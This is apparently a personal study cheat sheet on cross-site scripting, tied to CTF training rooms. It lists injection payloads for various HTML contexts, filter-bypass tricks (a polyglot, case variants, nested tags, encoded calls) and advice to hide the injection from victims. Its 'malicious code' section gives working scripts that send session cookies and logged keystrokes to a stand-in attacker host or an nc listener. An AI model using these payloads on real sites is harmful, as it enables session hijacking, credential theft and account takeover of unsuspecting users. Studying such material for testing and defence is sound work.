# Cross-site Scripting (XSS)

[Go back](../../index.md)

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![xss_injection](../../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xss_filter_evasion](../../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

<div class="row row-cols-md-2"><div>

Cross-site Scripting, most commonly called XSS, refers to injecting malicious JavaScript in a web application for it to be executed by other users. For instance, instead of a username, you could use:

```xml!
<script>alert('XSS')</script>
```

And, if the website isn't protected, then anyone consulting your profile will run the script `alert('XSS')` and will see an alert.

‚ö†Ô∏è When using XSS, you want to hide that you executed some XSS in someone browser. So, you should ensure that no one see anything suspicious. For instance, add a username before the XSS.
</div><div>

There are 4 categories of XSS.

* [Reflected XSS](files/rxss.md)
* [Stored XSS](files/sxss.md)
* [DOM-Based XSS](files/dxss.md)
* [Blind XSS](files/bxss.md)
</div></div>

<hr class="sep-both">

## XSS payloads

<table class="table table-bordered table-striped border-dark mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;console.log('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onload="maliciousCodeHere"</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onerror="maliciousCodeHere"</code></td></tr>
</tbody></table>

<hr class="sep-both">

## XSS 'malicious code'

<div class="row row-cols-md-2"><div>

Common "malicious code" used in PoC payloads are 

* `alert(...)`: show an alert with a message
* `console.log(...)`: print a message in the console

Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all).

#### Session hijacking

Anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can bypass verifications such as 2FA and access someone else account of insecure webservers.

```html
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<!--
CTF: nc -nlvp port | And use the IP:port
Decode: sed -n 's/GET \/?cookie=\(.*\)/\1/p' request | base64 -d
-->
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
```
</div><div>

#### Keylogger

Sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</div></div>

<hr class="sep-both">

## XSS filter by-pass

<div class="row row-cols-md-2"><div>

There are usually a lot done to avoid XSS attacks, but there is also a lot of way to by-pass weak filters.

* **Logic flaw**: for instance, a dropdown with a list of countries. A user use XSS. The developer didn't filter the value as they expected a value within the list.

* **Bypass HTML symbols filtering**: If `<`, and `>` are filtered, an attacker may still use DOM Based XSS.

* **Bypass DOM Based Filtering**: if there is a filter removing every attribute such as `onload`, `onmouseover`... they could try variants as HTML is case-insensitive.

```xml!
<img src="" ONERROR="alert('XSS')" />
```

* **Polygots**: these are magic payloads designed to bypass many tags/attributes/filters/... at once.

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

</div><div>

**Bypass keywords filtering**: most functions to filter something will only process the text once. It means that if the hacker knows that something is filtered, they may create a payload that is only working after being filtered. For instance, for a filter removing "&lt;script&gt;", below after filtering "&lt;s" and "cript&gt;" will be concatenated, effectively bypassing the filter.

```html!
<s<script>cript>alert('XSS');</s<script>cript>
// filter remove "<script>"
<script>alert('XSS');</script>
```

You can also try variants if the filter is case-sensitive

```html!
<scIpT>alert('XSS');</scIpT>
```

Another way of bypassing keyword filtering is using alternate code. For instance, with the function `alert`, we could do.

```html!
<img src="NOT_FOUND" onerror="eval('aler'+'t')('XSS')">
<!-- unicode in HTML with &# -->
<img src="NOT_FOUND" onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;('XSS')>
<!-- unicode with \u -->
<img src="NOT_FOUND" onerror=\u0061lert('XSS')>
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

* Place to check: forms, headers
</div><div>
</div></div>